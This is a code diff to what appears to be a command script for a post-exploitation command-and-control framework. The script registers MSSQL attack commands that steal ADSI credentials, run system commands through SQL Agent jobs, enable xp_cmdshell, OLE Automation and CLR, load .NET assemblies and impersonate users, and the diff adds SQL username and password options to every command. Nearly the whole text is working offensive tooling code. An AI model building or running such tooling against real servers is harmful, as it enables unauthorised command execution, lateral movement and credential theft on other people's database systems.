@@ -12,11 +12,13 @@ _cmd_1434udp.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var _cmd_adsi = ax.create_command("adsi", "Obtain ADSI creds from ADSI linked server", "mssql adsi [-p port] [-d database] [-l linkedserver] [-i impersonate] [server] [adsiserver]");
+var _cmd_adsi = ax.create_command("adsi", "Obtain ADSI creds from ADSI linked server", "mssql adsi [-p port] [-d database] [-l linkedserver] [-i impersonate] [-u user] [-P password] [server] [adsiserver]");
 _cmd_adsi.addArgFlagInt("-p",    "port",         "Optional: ADSI port", 0);
 _cmd_adsi.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_adsi.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
 _cmd_adsi.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
+_cmd_adsi.addArgFlagString("-u", "user",         "Optional: SQL username for SQL authentication", "");
+_cmd_adsi.addArgFlagString("-P", "password",     "Optional: SQL password for SQL authentication", "");
 _cmd_adsi.addArgString("server",      true, "SQL server to connect to");
 _cmd_adsi.addArgString("adsiserver",  true, "ADSI linked server name or address");
 _cmd_adsi.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
@@ -26,8 +28,10 @@ _cmd_adsi.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let database     = parsed_json["database"];
     let linkedserver = parsed_json["linkedserver"];
     let impersonate  = parsed_json["impersonate"];
+    let user         = parsed_json["user"];
+    let password     = parsed_json["password"];
 
-    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,int", [server, database, linkedserver, impersonate, adsiserver, port] );
+    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,int,cstr,cstr", [server, database, linkedserver, impersonate, adsiserver, port, user, password] );
     let bof_path = ax.script_dir() + "_bin/SQL/adsi." + ax.arch(id) + ".o";
     let message = "Task: Obtain ADSI credentials";
 
@@ -36,10 +40,12 @@ _cmd_adsi.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var _cmd_agentcmd = ax.create_command("agentcmd", "Execute a system command using agent jobs", "mssql agentcmd [-d database] [-l linkedserver] [-i impersonate] [server] [command]");
+var _cmd_agentcmd = ax.create_command("agentcmd", "Execute a system command using agent jobs", "mssql agentcmd [-d database] [-l linkedserver] [-i impersonate] [-u user] [-p password] [server] [command]");
 _cmd_agentcmd.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_agentcmd.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
 _cmd_agentcmd.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
+_cmd_agentcmd.addArgFlagString("-u", "user",         "Optional: SQL username for SQL authentication", "");
+_cmd_agentcmd.addArgFlagString("-p", "password",     "Optional: SQL password for SQL authentication", "");
 _cmd_agentcmd.addArgString("server",      true, "SQL server to connect to");
 _cmd_agentcmd.addArgString("command",     true, "System command to execute via agent job");
 _cmd_agentcmd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
@@ -48,8 +54,10 @@ _cmd_agentcmd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let database     = parsed_json["database"];
     let linkedserver = parsed_json["linkedserver"];
     let impersonate  = parsed_json["impersonate"];
+    let user         = parsed_json["user"];
+    let password     = parsed_json["password"];
 
-    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, command] );
+    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, command, user, password] );
     let bof_path = ax.script_dir() + "_bin/SQL/agentcmd." + ax.arch(id) + ".o";
     let message = "Task: Execute system command via SQL Agent";
 
@@ -58,18 +66,22 @@ _cmd_agentcmd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var _cmd_agentstatus = ax.create_command("agentstatus", "Enumerate SQL Agent status and jobs", "mssql agentstatus [-d database] [-l linkedserver] [-i impersonate] [server]");
+var _cmd_agentstatus = ax.create_command("agentstatus", "Enumerate SQL Agent status and jobs", "mssql agentstatus [-d database] [-l linkedserver] [-i impersonate] [-u user] [-p password] [server]");
 _cmd_agentstatus.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_agentstatus.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
 _cmd_agentstatus.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
+_cmd_agentstatus.addArgFlagString("-u", "user",         "Optional: SQL username for SQL authentication", "");
+_cmd_agentstatus.addArgFlagString("-p", "password",     "Optional: SQL password for SQL authentication", "");
 _cmd_agentstatus.addArgString("server", true, "SQL server to connect to");
 _cmd_agentstatus.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let server       = parsed_json["server"];
     let database     = parsed_json["database"];
     let linkedserver = parsed_json["linkedserver"];
     let impersonate  = parsed_json["impersonate"];
+    let user         = parsed_json["user"];
+    let password     = parsed_json["password"];
 
-    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate] );
+    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, user, password] );
     let bof_path = ax.script_dir() + "_bin/SQL/agentstatus." + ax.arch(id) + ".o";
     let message = "Task: Enumerate SQL Agent status and jobs";
 
@@ -78,18 +90,22 @@ _cmd_agentstatus.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
 
 
 
-var _cmd_checkrpc = ax.create_command("checkrpc", "Enumerate RPC status of linked servers", "mssql checkrpc [-d database] [-l linkedserver] [-i impersonate] [server]");
+var _cmd_checkrpc = ax.create_command("checkrpc", "Enumerate RPC status of linked servers", "mssql checkrpc [-d database] [-l linkedserver] [-i impersonate] [-u user] [-p password] [server]");
 _cmd_checkrpc.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_checkrpc.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
 _cmd_checkrpc.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
+_cmd_checkrpc.addArgFlagString("-u", "user",         "Optional: SQL username for SQL authentication", "");
+_cmd_checkrpc.addArgFlagString("-p", "password",     "Optional: SQL password for SQL authentication", "");
 _cmd_checkrpc.addArgString("server", true, "SQL server to connect to");
 _cmd_checkrpc.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let server       = parsed_json["server"];
     let database     = parsed_json["database"];
     let linkedserver = parsed_json["linkedserver"];
     let impersonate  = parsed_json["impersonate"];
+    let user         = parsed_json["user"];
+    let password     = parsed_json["password"];
 
-    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate] );
+    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, user, password] );
     let bof_path = ax.script_dir() + "_bin/SQL/checkrpc." + ax.arch(id) + ".o";
     let message = "Task: Enumerate RPC status on linked servers";
 
@@ -98,11 +114,13 @@ _cmd_checkrpc.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var _cmd_clr = ax.create_command("clr", "Load and execute a .NET assembly in a stored procedure", "mssql clr -h [hash] [-d database] [-l linkedserver] [-i impersonate] [server] [dll_path] [function]");
+var _cmd_clr = ax.create_command("clr", "Load and execute a .NET assembly in a stored procedure", "mssql clr -h [hash] [-d database] [-l linkedserver] [-i impersonate] [-u user] [-p password] [server] [dll_path] [function]");
 _cmd_clr.addArgFlagString("-h", "hash",         "Required: SHA-512 hash of DLL", "");
 _cmd_clr.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_clr.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
 _cmd_clr.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
+_cmd_clr.addArgFlagString("-u", "user",         "Optional: SQL username for SQL authentication", "");
+_cmd_clr.addArgFlagString("-p", "password",     "Optional: SQL password for SQL authentication", "");
 _cmd_clr.addArgString("server",   true, "SQL server to connect to");
 _cmd_clr.addArgString("dll_path", true, "Path to .NET assembly DLL");
 _cmd_clr.addArgString("function", true, "Entry-point function name");
@@ -114,6 +132,8 @@ _cmd_clr.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let linkedserver = parsed_json["linkedserver"];
     let impersonate  = parsed_json["impersonate"];
     let userHash     = parsed_json["hash"];
+    let user         = parsed_json["user"];
+    let password     = parsed_json["password"];
 
     let base64Data = ax.file_read(dllPath);
 
@@ -165,9 +185,9 @@ _cmd_clr.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
     let dllHash = userHash.toUpperCase();
 
-    // Pack all as cstr (7 strings, NO bytes type)
-    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr,cstr,cstr,cstr",
-        [server, database, linkedserver, impersonate, functionName, dllHash, hexString]);
+    // Pack all as cstr (9 strings, NO bytes type)
+    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr,cstr,cstr,cstr,cstr,cstr",
+        [server, database, linkedserver, impersonate, functionName, dllHash, hexString, user, password]);
     let bof_path = ax.script_dir() + "_bin/SQL/clr." + ax.arch(id) + ".o";
     let message = "Task: execute CLR assembly " + ax.file_basename(dllPath);
 
@@ -177,10 +197,12 @@ _cmd_clr.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var _cmd_columns = ax.create_command("columns", "Enumerate columns within a table", "mssql columns [-d database] [-l linkedserver] [-i impersonate] [server] [table]");
+var _cmd_columns = ax.create_command("columns", "Enumerate columns within a table", "mssql columns [-d database] [-l linkedserver] [-i impersonate] [-u user] [-p password] [server] [table]");
 _cmd_columns.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_columns.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
 _cmd_columns.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
+_cmd_columns.addArgFlagString("-u", "user",         "Optional: SQL username for SQL authentication", "");
+_cmd_columns.addArgFlagString("-p", "password",     "Optional: SQL password for SQL authentication", "");
 _cmd_columns.addArgString("server", true, "SQL server to connect to");
 _cmd_columns.addArgString("table",  true, "Table to enumerate columns from");
 _cmd_columns.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
@@ -189,8 +211,10 @@ _cmd_columns.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let database     = parsed_json["database"];
     let linkedserver = parsed_json["linkedserver"];
     let impersonate  = parsed_json["impersonate"];
+    let user         = parsed_json["user"];
+    let password     = parsed_json["password"];
 
-    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr", [server, database, table, linkedserver, impersonate] );
+    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr,cstr", [server, database, table, linkedserver, impersonate, user, password] );
     let bof_path = ax.script_dir() + "_bin/SQL/columns." + ax.arch(id) + ".o";
     let message = "Task: Enumerate columns in table";
 
@@ -199,18 +223,22 @@ _cmd_columns.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var _cmd_databases = ax.create_command("databases", "Enumerate SQL databases", "mssql databases [-d database] [-l linkedserver] [-i impersonate] [server]");
+var _cmd_databases = ax.create_command("databases", "Enumerate SQL databases", "mssql databases [-d database] [-l linkedserver] [-i impersonate] [-u user] [-p password] [server]");
 _cmd_databases.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_databases.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
 _cmd_databases.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
+_cmd_databases.addArgFlagString("-u", "user",         "Optional: SQL username for SQL authentication", "");
+_cmd_databases.addArgFlagString("-p", "password",     "Optional: SQL password for SQL authentication", "");
 _cmd_databases.addArgString("server", true, "SQL server to connect to");
 _cmd_databases.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let server       = parsed_json["server"];
     let database     = parsed_json["database"];
     let linkedserver = parsed_json["linkedserver"];
     let impersonate  = parsed_json["impersonate"];
+    let user         = parsed_json["user"];
+    let password     = parsed_json["password"];
 
-    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate]);
+    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, user, password]);
     let bof_path = ax.script_dir() + "_bin/SQL/databases." + ax.arch(id) + ".o";
     let message = "Task: SQL Server whoami BOF";
 
@@ -219,18 +247,22 @@ _cmd_databases.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var _cmd_disableclr = ax.create_command("disableclr", "Disable CLR integration", "mssql disableclr [-d database] [-l linkedserver] [-i impersonate] [server]");
+var _cmd_disableclr = ax.create_command("disableclr", "Disable CLR integration", "mssql disableclr [-d database] [-l linkedserver] [-i impersonate] [-u user] [-p password] [server]");
 _cmd_disableclr.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_disableclr.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
 _cmd_disableclr.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
+_cmd_disableclr.addArgFlagString("-u", "user",         "Optional: SQL username for SQL authentication", "");
+_cmd_disableclr.addArgFlagString("-p", "password",     "Optional: SQL password for SQL authentication", "");
 _cmd_disableclr.addArgString("server", true, "SQL server to connect to");
 _cmd_disableclr.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let server       = parsed_json["server"];
     let database     = parsed_json["database"];
     let linkedserver = parsed_json["linkedserver"];
     let impersonate  = parsed_json["impersonate"];
+    let user         = parsed_json["user"];
+    let password     = parsed_json["password"];
 
-    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "clr enabled", "0"] );
+    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "clr enabled", "0", user, password] );
     let bof_path = ax.script_dir() + "_bin/SQL/togglemodule." + ax.arch(id) + ".o";
     let message = "Task: Disable CLR integration";
 
@@ -239,18 +271,22 @@ _cmd_disableclr.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) 
 
 
 
-var _cmd_disableole = ax.create_command("disableole", "Disable OLE Automation Procedures", "mssql disableole [-d database] [-l linkedserver] [-i impersonate] [server]");
+var _cmd_disableole = ax.create_command("disableole", "Disable OLE Automation Procedures", "mssql disableole [-d database] [-l linkedserver] [-i impersonate] [-u user] [-p password] [server]");
 _cmd_disableole.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_disableole.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
 _cmd_disableole.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
+_cmd_disableole.addArgFlagString("-u", "user",         "Optional: SQL username for SQL authentication", "");
+_cmd_disableole.addArgFlagString("-p", "password",     "Optional: SQL password for SQL authentication", "");
 _cmd_disableole.addArgString("server", true, "SQL server to connect to");
 _cmd_disableole.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let server       = parsed_json["server"];
     let database     = parsed_json["database"];
     let linkedserver = parsed_json["linkedserver"];
     let impersonate  = parsed_json["impersonate"];
+    let user         = parsed_json["user"];
+    let password     = parsed_json["password"];
 
-    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "Ole Automation Procedures", "0"] );
+    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "Ole Automation Procedures", "0", user, password] );
     let bof_path = ax.script_dir() + "_bin/SQL/togglemodule." + ax.arch(id) + ".o";
     let message = "Task: Disable OLE Automation";
 
@@ -259,9 +295,11 @@ _cmd_disableole.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) 
 
 
 
-var _cmd_disablerpc = ax.create_command("disablerpc", "Disable RPC and RPC out on a linked server", "mssql disablerpc [-d database] [-i impersonate] [server] [linkedserver]");
+var _cmd_disablerpc = ax.create_command("disablerpc", "Disable RPC and RPC out on a linked server", "mssql disablerpc [-d database] [-i impersonate] [-u user] [-p password] [server] [linkedserver]");
 _cmd_disablerpc.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_disablerpc.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
+_cmd_disablerpc.addArgFlagString("-u", "user",         "Optional: SQL username for SQL authentication", "");
+_cmd_disablerpc.addArgFlagString("-p", "password",     "Optional: SQL password for SQL authentication", "");
 _cmd_disablerpc.addArgString("server", true, "SQL server to connect to");
 _cmd_disablerpc.addArgString("linkedserver", true, "Linked server name");
 _cmd_disablerpc.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
@@ -269,8 +307,10 @@ _cmd_disablerpc.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) 
     let linkedserver = parsed_json["linkedserver"];
     let database     = parsed_json["database"];
     let impersonate  = parsed_json["impersonate"];
+    let user         = parsed_json["user"];
+    let password     = parsed_json["password"];
 
-    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "rpc", "FALSE"] );
+    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "rpc", "FALSE", user, password] );
     let bof_path = ax.script_dir() + "_bin/SQL/togglemodule." + ax.arch(id) + ".o";
     let message = "Task: Disable RPC on linked server";
 
@@ -279,18 +319,22 @@ _cmd_disablerpc.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) 
 
 
 
-var _cmd_disablexp = ax.create_command("disablexp", "Disable xp_cmdshell", "mssql disablexp [-d database] [-l linkedserver] [-i impersonate] [server]");
+var _cmd_disablexp = ax.create_command("disablexp", "Disable xp_cmdshell", "mssql disablexp [-d database] [-l linkedserver] [-i impersonate] [-u user] [-p password] [server]");
 _cmd_disablexp.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_disablexp.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
 _cmd_disablexp.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
+_cmd_disablexp.addArgFlagString("-u", "user",         "Optional: SQL username for SQL authentication", "");
+_cmd_disablexp.addArgFlagString("-p", "password",     "Optional: SQL password for SQL authentication", "");
 _cmd_disablexp.addArgString("server", true, "SQL server to connect to");
 _cmd_disablexp.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let server       = parsed_json["server"];
     let database     = parsed_json["database"];
     let linkedserver = parsed_json["linkedserver"];
     let impersonate  = parsed_json["impersonate"];
+    let user         = parsed_json["user"];
+    let password     = parsed_json["password"];
 
-    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "xp_cmdshell", "0"] );
+    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "xp_cmdshell", "0", user, password] );
     let bof_path = ax.script_dir() + "_bin/SQL/togglemodule." + ax.arch(id) + ".o";
     let message = "Task: Disable xp_cmdshell";
 
@@ -299,18 +343,22 @@ _cmd_disablexp.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var _cmd_enableclr = ax.create_command("enableclr", "Enable CLR integration", "mssql enableclr [-d database] [-l linkedserver] [-i impersonate] [server]");
+var _cmd_enableclr = ax.create_command("enableclr", "Enable CLR integration", "mssql enableclr [-d database] [-l linkedserver] [-i impersonate] [-u user] [-p password] [server]");
 _cmd_enableclr.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_enableclr.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
 _cmd_enableclr.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
+_cmd_enableclr.addArgFlagString("-u", "user",         "Optional: SQL username for SQL authentication", "");
+_cmd_enableclr.addArgFlagString("-p", "password",     "Optional: SQL password for SQL authentication", "");
 _cmd_enableclr.addArgString("server", true, "SQL server to connect to");
 _cmd_enableclr.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let server       = parsed_json["server"];
     let database     = parsed_json["database"];
     let linkedserver = parsed_json["linkedserver"];
     let impersonate  = parsed_json["impersonate"];
+    let user         = parsed_json["user"];
+    let password     = parsed_json["password"];
 
-    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "clr enabled", "1"] );
+    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "clr enabled", "1", user, password] );
     let bof_path = ax.script_dir() + "_bin/SQL/togglemodule." + ax.arch(id) + ".o";
     let message = "Task: Enable CLR integration";
 
@@ -319,18 +367,22 @@ _cmd_enableclr.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var _cmd_enableole = ax.create_command("enableole", "Enable OLE Automation Procedures", "mssql enableole [-d database] [-l linkedserver] [-i impersonate] [server]");
+var _cmd_enableole = ax.create_command("enableole", "Enable OLE Automation Procedures", "mssql enableole [-d database] [-l linkedserver] [-i impersonate] [-u user] [-p password] [server]");
 _cmd_enableole.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_enableole.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
 _cmd_enableole.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
+_cmd_enableole.addArgFlagString("-u", "user",         "Optional: SQL username for SQL authentication", "");
+_cmd_enableole.addArgFlagString("-p", "password",     "Optional: SQL password for SQL authentication", "");
 _cmd_enableole.addArgString("server", true, "SQL server to connect to");
 _cmd_enableole.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let server       = parsed_json["server"];
     let database     = parsed_json["database"];
     let linkedserver = parsed_json["linkedserver"];
     let impersonate  = parsed_json["impersonate"];
+    let user         = parsed_json["user"];
+    let password     = parsed_json["password"];
 
-    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "Ole Automation Procedures", "1"] );
+    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "Ole Automation Procedures", "1", user, password] );
     let bof_path = ax.script_dir() + "_bin/SQL/togglemodule." + ax.arch(id) + ".o";
     let message = "Task: Enable OLE Automation Procedures";
 
@@ -339,9 +391,11 @@ _cmd_enableole.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var _cmd_enablerpc = ax.create_command("enablerpc", "Enable RPC and RPC out on a linked server", "mssql enablerpc [-d database] [-i impersonate] [server] [linkedserver]");
+var _cmd_enablerpc = ax.create_command("enablerpc", "Enable RPC and RPC out on a linked server", "mssql enablerpc [-d database] [-i impersonate] [-u user] [-p password] [server] [linkedserver]");
 _cmd_enablerpc.addArgFlagString("-d", "database",    "Optional: Database to use", "");
 _cmd_enablerpc.addArgFlagString("-i", "impersonate", "Optional: User to impersonate during execution", "");
+_cmd_enablerpc.addArgFlagString("-u", "user",        "Optional: SQL username for SQL authentication", "");
+_cmd_enablerpc.addArgFlagString("-p", "password",    "Optional: SQL password for SQL authentication", "");
 _cmd_enablerpc.addArgString("server",       true, "SQL server to connect to");
 _cmd_enablerpc.addArgString("linkedserver", true, "Linked server name");
 _cmd_enablerpc.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
@@ -349,8 +403,10 @@ _cmd_enablerpc.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let linkedserver= parsed_json["linkedserver"];
     let database    = parsed_json["database"];
     let impersonate = parsed_json["impersonate"];
+    let user        = parsed_json["user"];
+    let password    = parsed_json["password"];
 
-    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "rpc", "TRUE"] );
+    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "rpc", "TRUE", user, password] );
     let bof_path = ax.script_dir() + "_bin/SQL/togglemodule." + ax.arch(id) + ".o";
     let message = "Task: Enable RPC on linked server";
 
@@ -359,18 +415,22 @@ _cmd_enablerpc.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var _cmd_enablexp = ax.create_command("enablexp", "Enable xp_cmdshell", "mssql enablexp [-d database] [-l linkedserver] [-i impersonate] [server]");
+var _cmd_enablexp = ax.create_command("enablexp", "Enable xp_cmdshell", "mssql enablexp [-d database] [-l linkedserver] [-i impersonate] [-u user] [-p password] [server]");
 _cmd_enablexp.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_enablexp.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
 _cmd_enablexp.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
+_cmd_enablexp.addArgFlagString("-u", "user",         "Optional: SQL username for SQL authentication", "");
+_cmd_enablexp.addArgFlagString("-p", "password",     "Optional: SQL password for SQL authentication", "");
 _cmd_enablexp.addArgString("server", true, "SQL server to connect to");
 _cmd_enablexp.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let server       = parsed_json["server"];
     let database     = parsed_json["database"];
     let linkedserver = parsed_json["linkedserver"];
     let impersonate  = parsed_json["impersonate"];
+    let user         = parsed_json["user"];
+    let password     = parsed_json["password"];
 
-    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "xp_cmdshell", "1"] );
+    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "xp_cmdshell", "1", user, password] );
     let bof_path = ax.script_dir() + "_bin/SQL/togglemodule." + ax.arch(id) + ".o";
     let message = "Task: Enable xp_cmdshell";
 
@@ -379,14 +439,18 @@ _cmd_enablexp.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var _cmd_impersonate = ax.create_command("impersonate", "Enumerate users that can be impersonated", "mssql impersonate [-d database] [server]");
+var _cmd_impersonate = ax.create_command("impersonate", "Enumerate users that can be impersonated", "mssql impersonate [-d database] [-u user] [-p password] [server]");
 _cmd_impersonate.addArgFlagString("-d", "database", "Optional: Database to use", "");
+_cmd_impersonate.addArgFlagString("-u", "user",     "Optional: SQL username for SQL authentication", "");
+_cmd_impersonate.addArgFlagString("-p", "password", "Optional: SQL password for SQL authentication", "");
 _cmd_impersonate.addArgString("server", true, "SQL server to connect to");
 _cmd_impersonate.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let server   = parsed_json["server"];
     let database = parsed_json["database"];
+    let user     = parsed_json["user"];
+    let password = parsed_json["password"];
 
-    let bof_params = ax.bof_pack("cstr,cstr", [server, database]);
+    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr", [server, database, user, password]);
     let bof_path = ax.script_dir() + "_bin/SQL/impersonate." + ax.arch(id) + ".o";
     let message = "Task: SQL Server impersonation enumeration";
 
@@ -395,14 +459,18 @@ _cmd_impersonate.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
 
 
 
-var _cmd_info = ax.create_command("info", "Gather information about the SQL Server", "mssql info [-d database] [server]");
+var _cmd_info = ax.create_command("info", "Gather information about the SQL Server", "mssql info [-d database] [-u user] [-p password] [server]");
 _cmd_info.addArgFlagString("-d", "database", "Optional: Database to use", "");
+_cmd_info.addArgFlagString("-u", "user",     "Optional: SQL username for SQL authentication", "");
+_cmd_info.addArgFlagString("-p", "password", "Optional: SQL password for SQL authentication", "");
 _cmd_info.addArgString("server", true, "SQL server to connect to");
 _cmd_info.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let server   = parsed_json["server"];
     let database = parsed_json["database"];
+    let user     = parsed_json["user"];
+    let password = parsed_json["password"];
 
-    let bof_params = ax.bof_pack("cstr,cstr", [server, database]);
+    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr", [server, database, user, password]);
     let bof_path = ax.script_dir() + "_bin/SQL/info." + ax.arch(id) + ".o";
     let message = "Task: SQL Server impersonation enumeration";
 
@@ -411,18 +479,22 @@ _cmd_info.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var _cmd_links = ax.create_command("links", "Enumerate linked servers", "mssql links [-d database] [-l linkedserver] [-i impersonate] [server]");
+var _cmd_links = ax.create_command("links", "Enumerate linked servers", "mssql links [-d database] [-l linkedserver] [-i impersonate] [-u user] [-p password] [server]");
 _cmd_links.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_links.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
 _cmd_links.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
+_cmd_links.addArgFlagString("-u", "user",         "Optional: SQL username for SQL authentication", "");
+_cmd_links.addArgFlagString("-p", "password",     "Optional: SQL password for SQL authentication", "");
 _cmd_links.addArgString("server", true, "SQL server to connect to");
 _cmd_links.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let server       = parsed_json["server"];
     let database     = parsed_json["database"];
     let linkedserver = parsed_json["linkedserver"];
     let impersonate  = parsed_json["impersonate"];
+    let user         = parsed_json["user"];
+    let password     = parsed_json["password"];
 
-    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate] );
